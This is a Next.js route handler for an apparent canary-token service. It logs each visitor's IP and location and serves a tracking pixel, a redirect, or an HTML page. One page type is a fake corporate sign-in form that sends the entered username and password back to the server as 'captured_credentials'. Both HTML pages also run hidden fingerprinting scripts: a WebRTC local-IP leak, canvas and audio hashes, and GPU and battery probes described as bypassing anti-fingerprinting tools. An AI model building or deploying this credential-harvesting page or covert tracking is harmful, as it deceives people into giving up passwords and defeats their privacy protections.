import { NextRequest, NextResponse } from 'next/server';
import { createAlert, getToken } from '@/lib/storage';

const transparentPixel = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

export const dynamic = 'force-dynamic';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const resolvedParams = await params;
  const token_id = resolvedParams.id;

  const vercelForwarded = request.headers.get('x-vercel-forwarded-for');
  const forwardedFor = request.headers.get('x-forwarded-for');
  const realIp = request.headers.get('x-real-ip');
  
  const attacker_ip = (vercelForwarded ? vercelForwarded.split(',')[0].trim() : null) || 
                      (forwardedFor ? forwardedFor.split(',')[0].trim() : null) || 
                      realIp || 
                      'Unknown IP';
  const user_agent = request.headers.get('user-agent') || 'Unknown User-Agent';
  
  const city = request.headers.get('x-vercel-ip-city') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  const lat = request.headers.get('x-vercel-ip-latitude') || '';
  const lon = request.headers.get('x-vercel-ip-longitude') || '';
  
  let location = city && country ? `${city}, ${country}` : (country || 'Unknown Location');
  if (lat && lon) {
    location += ` (${lat}, ${lon})`;
  }

  let alertId = '';
  try {
    const alert = await createAlert(token_id, attacker_ip, user_agent, location);
    alertId = alert.id;
  } catch (err) {
    console.error('Exception logging alert:', err);
  }

  const token = await getToken(token_id);
  
  const accept = request.headers.get('accept') || '';
  const isHtmlRequest = accept.includes('text/html');
  
  let finalUrl = token?.redirect_url || '';
  if (finalUrl && !finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
    finalUrl = 'https://' + finalUrl;
  }

  const payloadType = token?.payload_type || 'invisible';

  if (isHtmlRequest) {
    if (payloadType === 'fake_login') {
      const loginHtml = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure IT Portal - Sign In</title>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f2f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login-box { background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); width: 100%; max-width: 360px; }
          .logo { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
          .title { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
          .input-group { margin-bottom: 16px; }
          input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #666; border-radius: 0; box-sizing: border-box; font-size: 15px; }
          input[type="text"]:focus, input[type="password"]:focus { outline: 1px solid #0067b8; border-color: #0067b8; }
          .btn { background-color: #0067b8; color: white; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; margin-top: 16px; }
          .btn:hover { background-color: #005da6; }
          .footer-links { margin-top: 40px; font-size: 13px; color: #0067b8; clear: both; }
          #error-msg { color: #e81123; font-size: 14px; margin-bottom: 16px; display: none; }
        </style>
      </head>
      <body>
        <div class="login-box">
          <div class="logo">Corporate IT Services</div>
          <div class="title">Sign in</div>
          <div id="error-msg">Incorrect user ID or password. Type the correct user ID and password, and try again.</div>
          <form id="loginForm">
            <div class="input-group">
              <input type="text" id="username" placeholder="someone@example.com" required>
            </div>
            <div class="input-group" id="pass-group" style="display:none;">
              <input type="password" id="password" placeholder="Password">
            </div>
            <button type="button" class="btn" id="nextBtn">Next</button>
            <button type="submit" class="btn" id="submitBtn" style="display:none;">Sign in</button>
          </form>
          <div class="footer-links">Can't access your account?</div>
        </div>

        <script>
          const form = document.getElementById('loginForm');
          const nextBtn = document.getElementById('nextBtn');
          const submitBtn = document.getElementById('submitBtn');
          const usernameInput = document.getElementById('username');
          const passwordInput = document.getElementById('password');
          const passGroup = document.getElementById('pass-group');
          const errorMsg = document.getElementById('error-msg');

          nextBtn.addEventListener('click', () => {
            if (usernameInput.value.trim() !== '') {
              passGroup.style.display = 'block';
              nextBtn.style.display = 'none';
              submitBtn.style.display = 'block';
              passwordInput.focus();
            }
          });

          form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            try {
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  alert_id: '${alertId}', 
                  details: { captured_credentials: username + ':' + password } 
                })
              });
            } catch(err) {}

            errorMsg.style.display = 'block';
            passwordInput.value = '';
          });

          // Telemetry Script
          (async function() {
            try {
              let device_model = '';
              let os_platform = navigator.platform || '';
              let gpu_renderer = '';
              let battery_level = '';
              let connection_type = '';
              let touch_points = navigator.maxTouchPoints || 0;
              let exact_lat = null;
              let exact_lon = null;
              let local_ip = null;
              let threat_id = 'Unknown';
              
              try {
                const rtc = new RTCPeerConnection({iceServers:[]});
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (e) => {
                  if (e.candidate && e.candidate.candidate) {
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                    if (match) local_ip = match[1];
                  }
                };
              } catch(e) {}
              
              if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                  const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                  device_model = entropy.model || '';
                  if (entropy.platform) {
                    os_platform = entropy.platform;
                    if (entropy.platformVersion) os_platform += ' ' + entropy.platformVersion;
                  }
                } catch(e) {}
              }

              if (navigator.userAgent.match(/(iPhone|iPad|Macintosh)/i) && !device_model) {
                const max = Math.max(window.screen.width, window.screen.height);
                const min = Math.min(window.screen.width, window.screen.height);
                const res = min + 'x' + max + '@' + (window.devicePixelRatio || 1);
                const appleMap = {
                  '430x932@3': 'iPhone 14/15 Pro Max / 15 Plus',
                  '393x852@3': 'iPhone 14 Pro / 15 / 15 Pro',
                  '428x926@3': 'iPhone 12/13/14 Pro Max / 14 Plus',
                  '390x844@3': 'iPhone 12/13/14 / 12/13 Pro',
                  '375x812@3': 'iPhone X/XS / 11 Pro / 12/13 Mini',
                  '414x896@3': 'iPhone XS Max / 11 Pro Max',
                  '414x896@2': 'iPhone XR / 11',
                  '414x736@3': 'iPhone 6/7/8 Plus',
                  '375x667@2': 'iPhone 6/7/8 / SE (2nd/3rd)',
                  '320x568@2': 'iPhone 5/5s/SE (1st)',
                  '1024x1366@2': 'iPad Pro 12.9"',
                  '834x1194@2': 'iPad Pro 11"',
                  '820x1180@2': 'iPad Air (4th/5th)',
                  '834x1112@2': 'iPad Air 3 / Pro 10.5"',
                  '810x1080@2': 'iPad (7th/8th/9th)',
                  '768x1024@2': 'iPad Mini / iPad (5th/6th)'
                };
                if (appleMap[res]) device_model = appleMap[res];
              }

              try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top'; ctx.font = '14px "Arial"'; ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069'; ctx.fillText('canary,token', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('canary,token', 4, 17);
                const canvasData = canvas.toDataURL();

                let audioData = '';
                try {
                  const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                  const oscillator = audioCtx.createOscillator();
                  oscillator.type = 'triangle'; oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
                  const compressor = audioCtx.createDynamicsCompressor();
                  compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
                  compressor.knee.setValueAtTime(40, audioCtx.currentTime);
                  compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
                  compressor.attack.setValueAtTime(0, audioCtx.currentTime);
                  compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
                  oscillator.connect(compressor); compressor.connect(audioCtx.destination);
                  oscillator.start(0);
                  audioCtx.oncomplete = (e) => {
                    const buffer = e.renderedBuffer.getChannelData(0);
                    audioData = buffer.slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString();
                  };
                  audioCtx.startRendering();
                } catch(e) {}

                const cyrb53 = function(str, seed = 0) {
                  let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
                  for (let i = 0, ch; i < str.length; i++) {
                    ch = str.charCodeAt(i);
                    h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677);
                  }
                  h1 = Math.imul(h1 ^ (h1>>>16), 2246822507) ^ Math.imul(h2 ^ (h2>>>13), 3266489909);
                  h2 = Math.imul(h2 ^ (h2>>>16), 2246822507) ^ Math.imul(h1 ^ (h1>>>13), 3266489909);
                  return 4294967296 * (2097151 & h2) + (h1>>>0);
                };

                threat_id = 'T-' + cyrb53(canvasData + audioData).toString(16).toUpperCase();
              } catch(e) {}

              try {
                for(let i = 0; i < 100; i++) {
                  const canvas = document.createElement('canvas');
                  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                  if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                      const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                      if (gpu) gpu_renderer = gpu;
                    }
                  }
                }
              } catch(e) {}

              try {
                for(let i = 0; i < 100; i++) {
                  if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    battery_level = Math.round(battery.level * 100) + '% ' + (battery.charging ? '(Charging)' : '');
                  }
                  if (navigator.connection && navigator.connection.effectiveType) connection_type = navigator.connection.effectiveType;
                  if (navigator.maxTouchPoints) touch_points = navigator.maxTouchPoints;
                  await new Promise(r => setTimeout(r, 2));
                }
              } catch(e) {}

              const details = {
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_resolution: window.screen.width + 'x' + window.screen.height,
                device_model: device_model,
                os_platform: os_platform,
                gpu_renderer: gpu_renderer,
                battery_level: battery_level,
                connection_type: connection_type,
                touch_points: touch_points,
                exact_lat: exact_lat,
                exact_lon: exact_lon,
                local_ip: local_ip,
                threat_id: threat_id
              };
              
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ alert_id: '${alertId}', details })
              });
            } catch(e) {}
          })();
        </script>
      </body>
      </html>
      `;
      return new Response(loginHtml, { 
        headers: { 'Content-Type': 'text/html', 'Cache-Control': 'no-store, no-cache, must-revalidate' }
      });
    }

    // Default HTML payload (Invisible or Redirect)
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body style="background: #000;">
      <script>
        (async function() {
          try {
            let device_model = '';
            let os_platform = navigator.platform || '';
            let gpu_renderer = '';
            let battery_level = '';
            let connection_type = '';
            let touch_points = navigator.maxTouchPoints || 0;
            
            // Attempt to get exact device model and true OS version on modern browsers (Android/Chrome)
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
              try {
                const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                device_model = entropy.model || '';
                if (entropy.platform) {
                  os_platform = entropy.platform;
                  if (entropy.platformVersion) {
                    // On Android, platformVersion maps to the real Android version (e.g. 14.0.0)
                    os_platform += ' ' + entropy.platformVersion;
                  }
                }
              } catch(e) {}
            }

            let exact_lat = null;
            let exact_lon = null;
            let local_ip = null;
            let threat_id = 'Unknown';

            try {
              const rtc = new RTCPeerConnection({iceServers:[]});
              rtc.createDataChannel('');
              rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
              rtc.onicecandidate = (e) => {
                if (e.candidate && e.candidate.candidate) {
                  const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                  if (match) local_ip = match[1];
                }
              };
            } catch(e) {}

            // Cryptographic Fingerprinting (Canvas + Audio + Fonts)
            try {
              // 1. Canvas Hash
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              ctx.textBaseline = 'top';
              ctx.font = '14px "Arial"';
              ctx.textBaseline = 'alphabetic';
              ctx.fillStyle = '#f60';
              ctx.fillRect(125,1,62,20);
              ctx.fillStyle = '#069';
              ctx.fillText('canary,token', 2, 15);
              ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
              ctx.fillText('canary,token', 4, 17);
              const canvasData = canvas.toDataURL();

              // 2. Audio Hash
              let audioData = '';
              try {
                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const oscillator = audioCtx.createOscillator();
                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
                const compressor = audioCtx.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
                compressor.knee.setValueAtTime(40, audioCtx.currentTime);
                compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
                compressor.attack.setValueAtTime(0, audioCtx.currentTime);
                compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
                oscillator.connect(compressor);
                compressor.connect(audioCtx.destination);
                oscillator.start(0);
                audioCtx.oncomplete = (e) => {
                  const buffer = e.renderedBuffer.getChannelData(0);
                  audioData = buffer.slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString();
                };
                audioCtx.startRendering();
              } catch(e) {}

              // Simple hash function
              const cyrb53 = function(str, seed = 0) {
                let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
                for (let i = 0, ch; i < str.length; i++) {
                  ch = str.charCodeAt(i);
                  h1 = Math.imul(h1 ^ ch, 2654435761);
                  h2 = Math.imul(h2 ^ ch, 1597334677);
                }
                h1 = Math.imul(h1 ^ (h1>>>16), 2246822507) ^ Math.imul(h2 ^ (h2>>>13), 3266489909);
                h2 = Math.imul(h2 ^ (h2>>>16), 2246822507) ^ Math.imul(h1 ^ (h1>>>13), 3266489909);
                return 4294967296 * (2097151 & h2) + (h1>>>0);
              };

              // Combine to generate unique threat ID
              threat_id = 'T-' + cyrb53(canvasData + audioData).toString(16).toUpperCase();
            } catch(e) {}

            // Extract GPU (100 verification passes to bypass anti-fingerprinting spoofers)
            try {
              for(let i = 0; i < 100; i++) {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                  if (debugInfo) {
                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    if (gpu) gpu_renderer = gpu;
                  }
                }
              }
            } catch(e) {}

            // Extract & Verify Battery, Connection, and Touch (100 passes for accuracy)
            try {
              for(let i = 0; i < 100; i++) {
                if (navigator.getBattery) {
                  const battery = await navigator.getBattery();
                  battery_level = Math.round(battery.level * 100) + '% ' + (battery.charging ? '(Charging)' : '');
                }
                if (navigator.connection && navigator.connection.effectiveType) {
                  connection_type = navigator.connection.effectiveType;
                }
                if (navigator.maxTouchPoints) {
                  touch_points = navigator.maxTouchPoints;
                }
                // Micro-delay to allow asynchronous sensors to settle and prevent misfires
                await new Promise(r => setTimeout(r, 2));
              }
            } catch(e) {}

            const details = {
              hardware_concurrency: navigator.hardwareConcurrency,
              device_memory: navigator.deviceMemory,
              language: navigator.language,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              screen_resolution: window.screen.width + 'x' + window.screen.height,
              device_model: device_model,
              os_platform: os_platform,
              gpu_renderer: gpu_renderer,
              battery_level: battery_level,
              connection_type: connection_type,
              touch_points: touch_points,
              exact_lat: exact_lat,
              exact_lon: exact_lon,
              local_ip: local_ip,
              threat_id: threat_id
            };
            
            await fetch('/api/v1/event', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ alert_id: '${alertId}', details })
            });
          } catch(e) {}
          
          ${finalUrl ? `window.location.replace('${finalUrl}');` : ''}
        })();
      </script>
    </body>
    </html>
    `;
    
    return new Response(html, { 
      headers: { 
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate'
      }
    });
  }

  if (finalUrl) {
    try {
      // Validate URL parse
      new URL(finalUrl);
      return NextResponse.redirect(finalUrl, 302);
    } catch (e) {
      console.error('Invalid redirect URL:', finalUrl);
      // Fallback to transparent pixel if URL is completely invalid
    }
  }

  return new Response(transparentPixel, {
    status: 200,
    headers: {
      'Content-Type': 'image/gif',
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}
